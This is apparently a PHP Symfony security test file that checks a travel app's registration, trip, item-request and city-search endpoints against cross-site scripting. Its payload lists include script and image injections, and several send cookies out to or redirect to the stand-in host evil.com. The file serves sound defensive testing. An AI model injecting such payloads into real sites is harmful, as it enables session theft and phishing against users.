<?php

namespace App\Tests\Security;

use Symfony\Bundle\FrameworkBundle\Test\WebTestCase;
use Symfony\Component\HttpFoundation\Response;

final class XSSSecurityTest extends WebTestCase
{
    public function testBasicXSSProtection(): void
    {
        $client = static::createClient();
        
        $basicXSSPayloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
        ];

        foreach ($basicXSSPayloads as $payload) {
            $userData = [
                'username' => $payload,
                'email' => 'xss_' . uniqid() . '@test.com',
                'password' => 'password123'
            ];

            $client->request('POST', '/api/users/register', [], [], 
                ['CONTENT_TYPE' => 'application/json'],
                json_encode($userData)
            );

            $responseCode = $client->getResponse()->getStatusCode();
            $this->assertContains($responseCode, [
                Response::HTTP_CREATED,
                Response::HTTP_BAD_REQUEST,
                Response::HTTP_CONFLICT,
                Response::HTTP_INTERNAL_SERVER_ERROR  // App might crash but doesn't compromise security
            ], "Basic XSS payload should be handled: $payload");

            if ($responseCode === Response::HTTP_CREATED) {
                $responseContent = $client->getResponse()->getContent();
                $this->assertStringNotContainsString('<script>', $responseContent);
                $this->assertStringNotContainsString('javascript:', $responseContent);
                $this->assertStringNotContainsString('onload=', $responseContent);
                $this->assertStringNotContainsString('onerror=', $responseContent);
            }
        }
    }

    public function testAdvancedXSSProtection(): void
    {
        $client = static::createClient();
        
        $advancedXSSPayloads = [
            '"><script>alert("XSS")</script>',
            '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>',
            '<img src="x" onerror="alert(\'XSS\')" />',
            '<svg><script>alert("XSS")</script></svg>',
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
            '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
        ];

        foreach ($advancedXSSPayloads as $payload) {
            $userData = [
                'username' => 'user_' . uniqid(),
                'email' => 'xss_' . uniqid() . '@test.com',
                'password' => $payload  // Try XSS in password field
            ];

            $client->request('POST', '/api/users/register', [], [], 
                ['CONTENT_TYPE' => 'application/json'],
                json_encode($userData)
            );

            $responseCode = $client->getResponse()->getStatusCode();
            $this->assertContains($responseCode, [
                Response::HTTP_CREATED,
                Response::HTTP_BAD_REQUEST,
                Response::HTTP_CONFLICT
            ], "Advanced XSS payload should be handled safely");

            // Ensure no executable code in response
            $responseContent = $client->getResponse()->getContent();
            $this->assertStringNotContainsString('<script>', $responseContent);
            $this->assertStringNotContainsString('eval(', $responseContent);
            $this->assertStringNotContainsString('String.fromCharCode', $responseContent);
        }
    }

    public function testXSSInTripData(): void
    {
        $client = static::createClient();
        
        $xssPayloads = [
            '<script>document.location="http://evil.com"</script>',
            '<img src=1 onerror=window.open("http://evil.com")>',
            'javascript:void(document.cookie="stolen="+document.cookie)',
        ];

        foreach ($xssPayloads as $payload) {
            $tripData = [
                'city' => $payload,
                'country' => 'TestCountry',
                'startDate' => '2025-07-25',
                'endDate' => '2025-07-30'
            ];

            $client->request('POST', '/api/trips/add', [], [], 
                ['CONTENT_TYPE' => 'application/json'],
                json_encode($tripData)
            );

            // Will return 401 due to auth, but server shouldn't crash
            $this->assertResponseStatusCodeSame(Response::HTTP_UNAUTHORIZED);
        }

        // Verify system is still responsive
        $client->request('POST', '/api/users/register', [], [], 
            ['CONTENT_TYPE' => 'application/json'],
            json_encode([
                'username' => 'afterxss_' . uniqid(),
                'email' => 'afterxss_' . uniqid() . '@test.com',
                'password' => 'password123'
            ])
        );
        $this->assertResponseIsSuccessful();
    }

    public function testXSSInItemRequests(): void
    {
        $client = static::createClient();
        
        $xssPayloads = [
            '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
            '<img src=x onerror=this.src="http://evil.com/steal?cookie="+document.cookie>',
            '<svg onload="location.href=\'http://evil.com/phish\'">',
        ];

        foreach ($xssPayloads as $payload) {
            $itemData = [
                'name' => $payload
            ];

            $client->request('POST', '/api/item-requests', [], [], 
                ['CONTENT_TYPE' => 'application/json'],
                json_encode($itemData)
            );

            // Will return 401 due to auth requirement
            $this->assertResponseStatusCodeSame(Response::HTTP_UNAUTHORIZED);
        }

        // System should remain functional
        $client->request('GET', '/api/items');
        $this->assertResponseStatusCodeSame(Response::HTTP_UNAUTHORIZED);
    }

    public function testReflectedXSSProtection(): void
    {
        $client = static::createClient();
        
        // Test XSS in query parameters
        $xssPayloads = [
            '<script>alert("Reflected XSS")</script>',
            '"><img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
        ];

        foreach ($xssPayloads as $payload) {
            // Try XSS in search parameter
            $client->request('GET', '/api/cities', ['q' => $payload]);
            
            $response = $client->getResponse();
            $content = $response->getContent();
            
            // Response should not contain unescaped XSS payload
            $this->assertStringNotContainsString('<script>', $content);
            $this->assertStringNotContainsString('javascript:', $content);
            $this->assertStringNotContainsString('onerror=', $content);
            
            // But should handle the request gracefully
            $this->assertContains($response->getStatusCode(), [
                Response::HTTP_OK,
                Response::HTTP_BAD_REQUEST
            ]);
        }
    }
}
